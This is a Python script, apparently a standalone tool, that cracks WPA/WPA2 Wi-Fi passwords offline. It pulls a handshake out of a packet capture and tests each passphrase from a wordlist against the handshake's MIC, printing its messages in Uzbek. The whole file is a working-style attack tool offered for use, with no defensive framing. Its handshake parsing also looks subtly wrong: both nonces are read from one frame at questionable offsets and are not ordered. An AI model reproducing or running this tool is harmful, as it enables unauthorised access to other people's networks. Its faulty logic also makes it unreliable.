import sys
import hmac
import hashlib
import binascii
import time
from scapy.all import rdpcap, EAPOL, Dot11Beacon, Dot11Elt

def extract_ssid(packets):
    for pkt in packets:
        if pkt.haslayer(Dot11Beacon):
            ssid = pkt[Dot11Elt].info.decode(errors='ignore')
            return ssid
    return None

def extract_handshake(packets):
    for pkt in packets:
        if pkt.haslayer(EAPOL):
            try:
                ap_mac = pkt.addr2.replace(':', '').lower()
                client_mac = pkt.addr1.replace(':', '').lower()
                payload = pkt.getlayer(EAPOL).original
                mic = binascii.hexlify(payload[81:97]).decode()
                # Zero out MIC field
                eapol_data = payload[:81] + b'\x00' * 16 + payload[97:]
                anonce = payload[13:45]
                snonce = payload[45:77]
                return ap_mac, client_mac, anonce, snonce, mic, eapol_data
            except:
                continue
    return None, None, None, None, None, None

def get_pmk(passphrase, ssid):
    return hashlib.pbkdf2_hmac('sha1', passphrase.encode(), ssid.encode(), 4096, 32)

def get_ptk(pmk, a, b):
    ptk = b''
    for i in range(4):
        ptk += hmac.new(pmk, a + b + bytes([i]), hashlib.sha1).digest()
    return ptk[:64]

def crack_wifi(cap_file, wordlist_file):
    packets = rdpcap(cap_file)
    ssid = extract_ssid(packets)
    if not ssid:
        ssid = input("SSID topilmadi. Qo'lda kiriting: ")

    ap_mac, client_mac, anonce, snonce, real_mic, eapol = extract_handshake(packets)
    if not all([ap_mac, client_mac, anonce, snonce, real_mic, eapol]):
        print("[!] To‘liq handshake topilmadi.")
        return

    print(f"[i] Tarmoq nomi (SSID): {ssid}")
    print("[i] Parollar sinovda...")

    start_time = time.time()
    checked = 0

    try:
        with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                passphrase = line.strip()
                checked += 1

                pmk = get_pmk(passphrase, ssid)
                data = binascii.unhexlify(min(ap_mac, client_mac) + max(ap_mac, client_mac)) + anonce + snonce
                ptk = get_ptk(pmk, b"Pairwise key expansion", data)
                mic = hmac.new(ptk[0:16], eapol, hashlib.sha1).hexdigest()[:32]

                elapsed = time.time() - start_time
                rate = checked / elapsed if elapsed > 0 else 0

                print(f"[{checked}] Sinalayapti: {passphrase} | {rate:.2f} parol/s | {int(elapsed)}s o'tdi", end='\r')

                if mic.lower() == real_mic.lower():
                    print(f"\n[+] Parol topildi: {passphrase}")
                    return

    except KeyboardInterrupt:
        print("\n[!] To‘xtatildi.")
        return

    print("\n[-] Parol topilmadi.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Foydalanish: python crack_wifi.py handshake.cap wordlist.txt")
        sys.exit(1)

    cap_path = sys.argv[1]
    wordlist_path = sys.argv[2]
    crack_wifi(cap_path, wordlist_path)
